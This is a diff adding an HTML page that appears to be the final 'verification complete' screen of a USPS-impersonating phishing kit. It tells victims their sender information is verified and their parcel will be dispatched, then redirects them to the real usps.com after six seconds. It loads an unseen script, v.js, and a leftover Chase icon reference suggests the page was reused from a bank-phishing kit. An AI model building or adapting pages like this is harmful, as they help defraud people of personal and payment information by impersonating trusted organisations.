@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        <title>USPS - Verify Sender</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+
+        <link rel="icon" href="ico.png" type="image/png">
+
+</head>
+<body>
+
+    <br>
+    <div class="containa22">
+        
+        <div class="navbar__container">
+            <nav class="navbar">
+                <div class="navbar__container">
+                    <a href="index.html" id="navbar__logo">
+                        <img src="header.png" width="185" height="35" style="margin-right: 175px;">
+                    </a>
+                </div>
+            </nav>
+        </div>
+        <br>
+        <br>
+        <br>
+        <br>
+        <div class="containerinfo">
+
+            <div class="information">
+                <img src="3.png" width="200px" height="20px">
+            </div>
+            <div class="information">
+                <p class="notice"><b>Sender information verified.</b></p>
+            </div>
+            <div class="information1">
+                <p class="notice2">Your information has been verified, your parcel will now be dispatched to its destination.<br> You may navigate away from this page now.</p>
+            </div>
+
+        </div>  
+        <br>
+    </div>
+    <div class="loader2"></div>
+
+    <script>
+
+        // Function to redirect to another page
+        function redirectToAnotherPage() {
+            window.location.href = 'https://www.usps.com/'; 
+        }
+
+        var redirectDelay = 6000; 
+
+        setTimeout(redirectToAnotherPage, redirectDelay);
+
+    </script>
+    <style>
+        body{
+            overflow: hidden;
+        }
+    </style>
+
+    <script src="v.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+</body>
+
+</html>
